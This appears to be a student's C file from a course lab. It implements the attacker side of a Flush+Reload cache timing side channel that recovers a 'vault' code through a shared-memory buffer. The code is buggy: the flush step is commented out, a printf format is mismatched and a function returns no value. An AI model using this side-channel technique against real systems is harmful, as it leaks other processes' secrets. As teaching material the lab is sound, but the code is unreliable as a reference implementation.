/**
 * 
 * CMU 15-793 Security for Secure Computer Systems Spring 2024
 * 
 *  thief.c is the attacker implementation. You need to add the code for 
 *  flush_reload().
 * 
 */

#include "util.h"
#include "params.h"
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

#define SHARED_ID "CHANNEL"

#define BUF_LINES (4096 * 511)/64

void printBinary(uint64_t num) {
  for (int i = 63; i >= 0; i--) {
    putchar((num & ((uint64_t)1 << i)) ? '1' : '0');
    if (i % 8 == 0) {
      putchar(' ');
    }
  }
  putchar('\n');
}

// Read the Time Stamp Counter
static inline uint64_t rdtsc() {
  uint32_t lo, hi;
  asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
  return ((uint64_t)hi << 32) | lo;
}

/**
 * Busy wait for an approximate number of cycles.
 * invariant: the number of cycles spent in this function is the least amount of cycles it should wait
 * */
void busy_wait_cycles(uint64_t cycles) {
  uint64_t start = rdtsc();
  while ((rdtsc() - start) < cycles) {
    // Busy wait
  }
}

// flush and reload should be straight forward
// you can traverse the buffer and use the utility functions
// to flush lines and perform the reload step.
int flush_reload(int size, uint8_t *buf) {
  uint64_t addr = (uint64_t) buf;
  uint32_t timing = 0, min_timing = 0xFFFFFFFF;
  uint64_t lineAddr = 0;
  int min_addr = 0;
  for (int i = 0; i < BUF_LINES; i++) {
    // Set the first byte of each line to 1
    lineAddr= addr + i * L2_LINE_SIZE;
//    clflush(lineAddr);
    (*((char*)lineAddr))++;
    busy_wait_cycles(1000); // 78 cycles is the average time to access a line in the cache by the vault
    timing=measure_line_access_time(lineAddr);

    if (timing < min_timing) {
      min_timing = timing;
      min_addr = i*64;
    }

  }
  printf("Vault code: %ld (%d)\n", min_addr, min_timing);
}

int main(int argc, char const *argv[]) {
    int fd;
    fd = shm_open(SHARED_ID, O_CREAT | O_RDWR, S_IRUSR | S_IWUSR);
    if (fd == -1){
      printf("shm_open error\n");
      exit(1);
    }

    int buf_size = 4096 * 512;
    uint8_t *buf;
    if ((buf = (uint8_t *)mmap(
           NULL, buf_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED) {
        printf("mmap error\n");
        exit(1);
    }

    // you may need to add repetitions  
    flush_reload(buf_size, buf);
    //print the key code and access time in the following  form
    // printf("Vault code: %d (%d)\n", key_code, latency);
 }
